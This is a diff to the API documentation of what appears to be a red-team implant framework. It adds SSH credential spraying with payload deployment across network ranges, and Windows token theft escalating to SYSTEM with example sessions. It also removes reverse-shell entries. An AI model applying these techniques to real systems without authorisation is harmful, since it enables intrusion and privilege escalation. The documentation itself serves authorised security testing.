@@ -731,43 +731,101 @@ file.list("/etc/*ssh*") # List the contents of all dirs that have `ssh` in the n
 file.list("\\\\127.0.0.1\\c$\\Windows\\*.yml") # List files over UNC paths
 ```
 
-Each file is represented by a Dict type.
-Here is an example of the Dict layout:
+Here is a code snippet example, along with its output.
+Each file is returned as a Dict with their respective information. Note that the directory itself (in this example, `/tmp/some_dir`) will also be listed with the respective information.
+
+```python
+print(file.list("/tmp/some_dir"))
+```
+
+**NOTE:** On systems without a specific time field being tracked, the field is omitted. This means, for example, unix systems with `noatime` set will not have an `accessed` field visible in the `times` sub-Dict.
 
 ```json
 [
-    {
-        "file_name": "implants",
-        "absolute_path": "/workspace/realm/implants",
-        "size": 4096,
-        "owner": "root",
-        "group": "0",
-        "permissions": "40755",
-        "modified": "2023-07-09 01:35:40 UTC",
-        "type": "Directory"
+  {
+    "absolute_path": "/tmp/some_dir",
+    "file_name": "some_dir",
+    "group": "root",
+    "modified": "2026-07-12 18:17:39 UTC",
+    "owner": "root",
+    "permissions": "40775",
+    "size": 80,
+    "times": {
+      "accessed": 1783880431,
+      "changed": 1783880259, // changed is Unix-only (ctime)
+      "created": 1783880259,
+      "modified": 1783880259
     },
-    {
-        "file_name": "README.md",
-        "absolute_path": "/workspace/realm/README.md",
-        "size": 750,
-        "owner": "root",
-        "group": "0",
-        "permissions": "100644",
-        "modified": "2023-07-08 02:49:47 UTC",
-        "type": "File"
+    "type": "dir"
+  },
+  {
+    "absolute_path": "/tmp/some_dir/some_file",
+    "file_name": "some_file",
+    "group": "root",
+    "modified": "2026-07-12 18:17:39 UTC",
+    "owner": "root",
+    "permissions": "100664",
+    "size": 5,
+    "times": {
+      "accessed": -2208988800, // negative epoch, represents 2208988800 seconds before Jan 1 1970
+      "changed": 1783880431,
+      "created": 1783880259,
+      "modified": -2208988800
     },
-    {
-        "file_name": ".git",
-        "absolute_path": "/workspace/realm/.git",
-        "size": 4096,
-        "owner": "root",
-        "group": "0",
-        "permissions": "40755",
-        "modified": "2023-07-10 21:14:06 UTC",
-        "type": "Directory"
-    }
+    "type": "file"
+  },
+  {
+    "absolute_path": "/tmp/some_dir/some_other_dir",
+    "file_name": "some_other_dir",
+    "group": "root",
+    "modified": "1900-01-01 00:00:00 UTC",
+    "owner": "root",
+    "permissions": "40775",
+    "size": 40,
+    "times": {
+      "accessed": 1783880259,
+      "changed": 1783880259,
+      "created": 1783880259,
+      "modified": 1783880259
+    },
+    "type": "dir"
+  }
 ]
 ```
+
+### file.list_named_pipes
+
+`file.list_named_pipes(detailed: Optional<bool> = False) -> List<str> | List<Dict>`
+
+The **file.list_named_pipes** method enumerates all named pipes on the system.
+
+On **Windows**, enumerates the `\\.\pipe\` namespace. With `detailed=True`, opens each pipe to query instance count and max instances via `GetNamedPipeHandleState`/`GetNamedPipeInfo`.
+
+On **Unix** (Linux, macOS, BSD), scans `/tmp`, `/var/run`, `/var/tmp`, `/run` for FIFOs. On Linux additionally scans `/proc/*/fd` for `pipe:[inode]` entries. `detailed` param is ignored on Unix.
+
+```python
+# Simple list of pipe names
+pipes = file.list_named_pipes()
+for pipe in pipes:
+    print(pipe)
+
+# Detailed list with instance info (Windows only)
+pipes = file.list_named_pipes(detailed=True)
+for pipe in pipes:
+    print(f"{pipe['name']}: {pipe['instances']}/{pipe['max_instances']}")
+```
+
+Detailed mode dict fields:
+- `name` (str): Pipe name
+- `instances` (int or str): Current instance count, or `"ACCESS_DENIED"` if pipe couldn't be opened
+- `max_instances` (int or str): Maximum instances, `"UNLIMITED"`, `"UNKNOWN"`, or `"ACCESS_DENIED"`
+
+| OS | Supported |
+| --- | --- |
+| Windows | Yes (detailed + simple) |
+| Linux | Yes (simple only) |
+| macOS | Yes (FIFOs only, simple) |
+| BSD | Yes (FIFOs only, simple) |
 
 ### file.list_recent
 
@@ -835,6 +893,35 @@ file.read_binary("/etc/*ssh*") # Read the contents of all files that have `ssh` 
 file.read_binary("\\\\127.0.0.1\\c$\\Windows\\Temp\\metadata.yml") # Read file over Windows UNC
 ```
 
+### file.read_named_pipe
+
+`file.read_named_pipe(name: str, max_bytes: Optional<int> = None) -> str`
+
+The **file.read_named_pipe** method reads data from a named pipe.
+
+On **Windows**, `name` is the pipe name (e.g. `"mypipe"`) which expands to `\\.\pipe\mypipe`. A full path like `\\.\pipe\mypipe` is also accepted.
+
+On **Unix** (Linux, macOS, BSD), `name` is the full path to a FIFO (e.g. `"/tmp/mypipe"`).
+
+The optional `max_bytes` parameter limits the number of bytes read. If not specified, reads all available data to EOF. For time-based reads, use chunked reads in a loop:
+
+```python
+# Read all data from pipe
+data = file.read_named_pipe("mypipe")
+
+# Read up to 1024 bytes
+chunk = file.read_named_pipe("/tmp/mypipe", max_bytes=1024)
+
+# Time-based chunked read pattern
+result = ""
+stop = time.now() + 10
+while time.now() < stop:
+    chunk = file.read_named_pipe("/tmp/mypipe", max_bytes=4096)
+    if len(chunk) == 0:
+        break
+    result = result + chunk
+```
+
 ### file.remove
 
 `file.remove(path: str) -> None`
@@ -866,7 +953,7 @@ The **file.temp_file** method returns the path of a new temporary file with a ra
 The **file.tmp_dir** method creates a temporary directory and returns its absolute path. Operates similar to `mktemp -d`. The directory persists after the function returns.
 
 ### file.template
-  
+
 `file.template(template_path: str, dst: str, args: Dict<String, Value>, autoescape: bool) -> None`
 
 The **file.template** method reads a Jinja2 template file from disk, fill in the variables using `args` and then write it to the destination specified.
@@ -1054,18 +1141,6 @@ NOTE: Windows scans against `localhost`/`127.0.0.1` can behave unexpectedly or e
 
 The **pivot.create_portal** method opens a portal bi-directional stream.
 
-### pivot.reverse_shell_pty
-
-`pivot.reverse_shell_pty(cmd: Optional<str>) -> None`
-
-The **pivot.reverse_shell_pty** method spawns the provided command in a cross-platform PTY and opens a reverse shell over the agent's current transport (e.g. gRPC). If no command is provided, Windows will use `cmd.exe`. On other platforms, `/bin/bash` is used as a default, but if it does not exist then `/bin/sh` is used.
-
-### pivot.reverse_shell_repl
-
-`pivot.reverse_shell_repl() -> None`
-
-The **pivot.reverse_shell_repl** method spawns a basic REPL-style reverse shell with an Eldritch interpreter.
-
 ### pivot.smb_exec
 
 `pivot.smb_exec(target: str, port: int, username: str, password: str, hash: str, command: str) -> str`
@@ -1081,6 +1156,44 @@ ssh_copy will return `"Success"` if successful and `"Failed to run handle_ssh_co
 If the connection is successful but the copy writes a file error will be returned.
 ssh_copy will overwrite the remote file if it exists.
 The file directory the `dst` file exists in must exist in order for ssh_copy to work.
+
+### pivot.ssh_deploy
+
+`pivot.ssh_deploy(ips: List<str>, credentials: List<Dict>, cmd: str, privesc_cmd: Optional<str>, payload: Optional<bytes>, payload_dst: Optional<str>, timeout: Optional<int>, retries: Optional<int>) -> List<Dict>`
+
+The **pivot.ssh_deploy** method deploys a payload and/or command across a set of hosts via SSH. For each target (IP address or CIDR range) the provided credentials are tried in order until one succeeds. Once authenticated, the optional payload is copied via SFTP and `cmd` is executed. If the effective user is not root and `privesc_cmd` is provided, the privilege escalation command is run before `cmd`.
+
+- `ips` is a non-empty list of IP addresses and/or CIDR ranges (e.g. `["10.0.0.1", "10.0.0.0/24"]`). Each entry may include an optional SSH port using `host:port` syntax (e.g. `"127.0.0.1:2222"` or `"10.0.0.1:2222/24"` to apply port `2222` to every host in the range). IPv6 addresses with a port must be bracketed (e.g. `"[::1]:2222"`). When no port is supplied the default SSH port `22` is used. All entries must be valid.
+- `credentials` is a non-empty list of credential dictionaries of the form `{"principal": "<user>", "password": "<password>"}`, attempted in order on each host.
+- `cmd` is the command to run on the remote system (ideally as root).
+- `privesc_cmd` is an optional privilege escalation command to run when the effective user is not root.
+- `payload` is an optional `bytes` value containing the raw payload to copy to the remote system. It is intended to be used with readers such as `file.read_binary(path)` or `assets.read_binary(name)`.
+- `payload_dst` is an optional remote destination path for the payload. When omitted it defaults to `/tmp/payload`.
+- `timeout` is the per-connection timeout in seconds applied to each SSH authentication attempt. Defaults to `5` and must be positive.
+- `retries` is the number of additional retry passes over the full credential list on hosts that failed to connect. Defaults to `0` and must be non-negative.
+
+`ssh_deploy` returns a list of per-attempt result dictionaries — one row for every `(ip, principal)` combination actually tried. Each failed credential is recorded with the principal that was attempted and a descriptive `error` (including, when relevant, the server's advertised algorithms for negotiation failures), so operators can tell exactly which credentials were rejected. Credential iteration stops on the first success per host; credentials that were not attempted (because an earlier one succeeded) are not included.
+
+```json
+[
+    {
+        "ip": "10.0.0.1",
+        "status": "failed",
+        "principal": "admin",
+        "stdout": "",
+        "stderr": "",
+        "error": "authentication failed for 'admin' at 10.0.0.1:22: password authentication rejected for admin@10.0.0.1:22"
+    },
+    {
+        "ip": "10.0.0.1",
+        "status": "success",
+        "principal": "root",
+        "stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
+        "stderr": "",
+        "error": ""
+    }
+]
+```
 
 ### pivot.ssh_exec
 
@@ -1159,7 +1272,7 @@ The **process.kill** method will kill a process using the KILL signal given its 
 
 ### process.list
 
-`process.list() -> List<Dict>`
+`process.list(include_env: Optional<bool>) -> List<Dict>`
 
 The **process.list** method returns a list of dictionaries that describe each process. The dictionaries follow the schema:
 
@@ -1176,6 +1289,8 @@ The **process.list** method returns a list of dictionaries that describe each pr
     "environ": "CARGO_PKG_REPOSITORY= CARGO_PKG_RUST_VERSION= CARGO_PKG_VERSION=0.1.0 CARGO_PKG_VERSION_MAJOR=0",
 }
 ```
+
+The `include_env` parameter is an optional boolean (default `False`). When `True`, the `environ` field is included in each process dictionary. When `False` or omitted, the `environ` field is omitted.
 
 ### process.name
 
@@ -1486,6 +1601,46 @@ For users, will return name and groups of user.
 
 The **sys.hostname** method returns a String containing the host's hostname.
 
+### sys.impersonate
+
+`sys.impersonate(pid: int) -> int`
+
+The **sys.impersonate** method steals a token from a target process by PID and impersonates it. Returns the token store ID and automatically activates the token.
+
+Requires `SeDebugPrivilege` to open other users' process tokens.
+
+```python
+$> sys.tokens()
+
+| active | id | process  | source        | user                 |
+| ------ | -- | -------- | ------------- | -------------------- |
+| True   | 0  | imix.exe | process_token | DOMAIN\Administrator |
+
+# find SYSTEM process PID (ex. winlogon)
+for p in process.list():
+    if 'winlogon' in p['name'].lower():
+        print(p['pid'], p['name'])
+
+676 winlogon.exe
+
+# check if the current process has SeDebugPrivilege
+$> "SeDebugPrivilege=enabled" in sys.tokens(process.info()['pid'])[0]['privileges']
+True
+
+$> sys.impersonate(676)
+1
+
+$> sys.tokens()
+
+| active | id | process        | source              | user                 |
+| ------ | -- | -------------- | ------------------- | -------------------- |
+| False  | 0  | imix.exe       | process_token       | DOMAIN\Administrator |
+| True   | 1  | winlogon.exe   | impersonate:pid:676 | NT AUTHORITY\SYSTEM  |
+
+$> sys.shell('whoami')
+nt authority\system
+```
+
 ### sys.is_bsd
 
 `sys.is_bsd() -> bool`
@@ -1535,6 +1690,95 @@ sys.shell("ls /nofile")
     "stderr":"ls: cannot access '/nofile': No such file or directory\n",
     "status":2,
 }
+```
+
+On Windows, if an impersonation token is active (from `sys.impersonate()` or `sys.make_token()`), sys.shell automatically spawns `cmd.exe` via `CreateProcessWithTokenW` so the child process runs as the impersonated user. This ensures `whoami` and network operations reflect the active token. Without an active token, it falls back to normal operation.
+
+### sys.tokens
+
+`sys.tokens(pid: Option<int>) -> List<Dict>`
+
+The **sys.tokens** method lists tokens. With no arguments, returns all tokens in the global store. With a PID, returns the process token info including user and privileges.
+
+The first time **sys.tokens** is run, it enumerates all tokens and pulls the users and process names. Subsequent calls with no new tokens pulls the information from the store.
+
+**Stored tokens** (no args): Each dict has `active` (bool), `id` (int), `process` (str), `source` (str), and `user` (str). The default process token has an ID of 0, source of `"process_token"`, displays the current user, and begins active.
+
+**Process tokens** (with pid): Each dict has `user` (str, e.g. `"CORP\\admin"`), `pid` (int), `privileges` (list of `"PrivilegeName=enabled|disabled"`).
+
+```python
+$> sys.tokens()
+
+| active | id | process  | source        | user                 |
+| ------ | -- | -------- | ------------- | -------------------- |
+| True   | 0  | imix.exe | process_token | DOMAIN\Administrator |
+
+$> pprint(sys.tokens(pid=700)) # ex. winlogon.exe
+
+[
+  {
+    "pid": 700,
+    "privileges": [
+      "SeAssignPrimaryTokenPrivilege=disabled",
+      "SeIncreaseQuotaPrivilege=disabled",
+      "SeTcbPrivilege=enabled",
+      "SeSecurityPrivilege=disabled",
+      "SeTakeOwnershipPrivilege=disabled",
+      "SeLoadDriverPrivilege=disabled",
+      "SeProfileSingleProcessPrivilege=enabled",
+      "SeIncreaseBasePriorityPrivilege=enabled",
+      "SeCreatePermanentPrivilege=enabled",
+      "SeBackupPrivilege=disabled",
+      "SeRestorePrivilege=disabled",
+      "SeShutdownPrivilege=disabled",
+      "SeDebugPrivilege=enabled",
+      "SeAuditPrivilege=enabled",
+      "SeSystemEnvironmentPrivilege=disabled",
+      "SeChangeNotifyPrivilege=enabled",
+      "SeUndockPrivilege=disabled",
+      "SeManageVolumePrivilege=disabled",
+      "SeImpersonatePrivilege=enabled",
+      "SeCreateGlobalPrivilege=enabled",
+      "SeTrustedCredManAccessPrivilege=disabled"
+    ],
+    "user": "NT AUTHORITY\\SYSTEM"
+  }
+]
+```
+
+### sys.use_token
+
+`sys.use_token(id: int) -> bool`
+
+The **sys.use_token** method activates a stored token by ID. Deactivates any currently active token and applies the specified one to the beacon.
+
+ID `0` is the process token (original identity). `sys.use_token(0)` reverts to base permissions.
+
+For this example, assume PID 6767 is running as SYSTEM and the base process token is running as Administrator.
+
+```python
+$> sys.tokens()
+
+| active | id | process        | source               | user                 |
+| ------ | -- | -------------- | -------------------- | -------------------- |
+| False  | 0  | imix.exe       | process_token        | DOMAIN\Administrator |
+| True   | 1  | winlogon.exe   | impersonate:pid:6767 | NT AUTHORITY\SYSTEM  |
+
+$> sys.shell('whoami')['stdout']
+nt authority\system
+
+$> sys.use_token(0)
+True
+
+$> sys.tokens()
+
+| active | id | process        | source               | user                 |
+| ------ | -- | -------------- | -------------------- | -------------------- |
+| True   | 0  | imix.exe       | process_token        | DOMAIN\Administrator |
+| False  | 1  | winlogon.exe   | impersonate:pid:6767 | NT AUTHORITY\SYSTEM  |
+
+$> sys.shell('whoami')['stdout']
+domain\administrator
 ```
 
 ### sys.write_reg
